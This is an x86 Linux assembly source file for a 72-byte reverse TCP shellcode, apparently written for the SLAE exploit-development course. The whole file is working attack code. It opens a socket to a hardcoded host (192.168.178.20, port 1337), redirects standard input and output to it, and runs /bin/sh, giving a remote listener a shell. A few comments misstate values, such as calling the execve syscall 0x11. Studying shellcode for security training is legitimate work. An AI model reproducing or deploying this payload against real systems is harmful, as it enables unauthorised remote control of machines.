; Title: Shell Reverse TCP Shellcode - 72 byte
; Platform: linux/x86
; Date: 2015-01-06
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; Github: https://github.com/dhn/SLAE/
; SLAE-721

BITS 32

global _start
section .text

; syscalls kernel
SYS_SOCKETCALL equ 0x66
SYS_EXECVE     equ 0x0b
SYS_DUP2       equ 0x3f

; /usr/include/linux/net.h
SYS_SOCKET     equ 0x01

; IP/PORT settings
PORT           equ 0x3905     ; 1337 (network order)
IP             equ 0x14b2a8c0 ; 192.168.178.20

; struct setting
STRUCT_LEN     equ 0x10       ; 16 Byte
AF_INET        equ 0x02
SOCK_STREAM    equ 0x01

_start:
	; Reverse Shell TCP Shellcode (72 Byte)

socket:
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	;   |      |           |            |
	;  0x01    2           1            0
	;   |      \           |            /
	;  ebx      \________ esp _________/
	;                      |
	;                     ecx
	push SYS_SOCKETCALL    ; syscall 0x66
	pop eax                ; eax = 0x66

	; tell socketcall that we want to use socket()
	push SYS_SOCKET        ; SYS_SOCKET = 0x01
	pop ebx                ; ebx = 0x01

	; The cdq instruction copies the sign (bit 31)
	; of the value in the eax register into every
	; bit position in the edx register.
	cdq                    ; zero out edx
	push edx               ; IPPROTO_IP  = 0x00 (edx)
	push SOCK_STREAM       ; SOCK_STREAM = 0x01
	push AF_INET           ; AF_INET     = 0x02
	mov ecx, esp           ; save pointer to ecx

	int 0x80               ; syscall socket()

	pop edi                ; set esi to 0x02

	; save the file descriptor (sockfd) into edi.
	; change edi against eax, eax has now the
	; return value of socket() and edi has the
	; last value from top of the stack (0x02).
	xchg edi, eax       ; change edi against eax

	; ebx has now the the value: 0x02
	xchg ebx, eax          ; change ebx against eax
	mov al, SYS_SOCKETCALL ; syscall 0x66

	;  struct: [AF_INET, PORT, IPPROTO_IP]
	;     - sin_family: AF_INET     IPv4 Internet protocols
	;     - sin_port:   PORT        See settings in top of the file
	;     - sin_ip:     IPPROTO_IP  The IP value
	push DWORD IP          ; IP = 192.168.178.20
	push WORD PORT         ; PORT = 1337 (default)
	push BYTE bx           ; AF_INET = ebx is even 0x02
	mov ecx, esp           ; save pointer to ecx (struct)

connect:
	; connect(sockfd, [AF_INET, PORT, INADDR_ANY], len(struct));
	;   |      |      |                         |      |
	;  0x03   edi     \__________ ecx __________/     0x10
	;   |              \           |           /
	;  ebx              \________ esp ________/
	;                              |
	;                             ecx
	inc ebx                 ; increment the ebx to 0x03
	push STRUCT_LEN         ; STRUCT_LEN = 0x10 (16 byte)
	push ecx                ; the struct which is stored in ecx
	push edi                ; push the sockfd on the stack
	mov ecx, esp            ; save pointer to ecx

	int 0x80                ; syscall connect()

	; we use the fact that the ebx register is even 0x02.
	mov ecx, ebx            ; use the ebx value: 0x03
dup2:
	; dup2(oldfd, newfd);
	;  |     |      |
	; 0x3f   |    [2-0]
	;  |    ebx     |
	; eax          ecx
	dec cl                 ; decrement the counter
	mov BYTE al, SYS_DUP2  ; syscall 0x3f
	int 0x80               ; syscall dup2()
	jnz dup2               ; jump to dup2 until Z-Flag is set

execve:
	; execve("/bin//sh/", 0, 0);
	;   |    |         |  |  |
	;  0x11  |         |  | edx
	;   |    \__ esp __/ edx
	;  eax        |
	;            ebx
	push SYS_EXECVE        ; syscall = 0x11
	pop eax                ; set SYS_EXECVE to eax

	; The cdq instruction copies the sign (bit 31)
	; of the value in the eax register into every
	; bit position in the edx register.
	cdq                    ; zero out edx
	push edx               ; push edx to stack
	push 0x68732f2f        ; push 'hs//'
	push 0x6e69622f        ; push 'nib/'
	mov ebx, esp           ; save pointer to ebx

	int 0x80               ; syscall execve
